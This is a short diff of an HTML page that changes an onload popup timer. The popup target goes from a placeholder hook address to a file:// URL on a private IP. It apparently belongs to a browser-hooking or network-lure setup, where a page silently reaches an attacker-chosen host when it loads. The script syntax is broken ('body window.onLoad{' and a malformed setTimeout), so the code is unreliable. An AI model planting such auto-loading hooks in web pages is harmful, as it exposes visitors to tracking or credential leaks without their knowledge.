@@ -15,7 +15,7 @@
     
 <body window.onLoad{
 setTimeout(
-popup('http://<IP-ADDRESS_N_HOOK>'){
+popup('file://192.168.100.119/foo.jpg'){
 4000
 )};>
     </script>
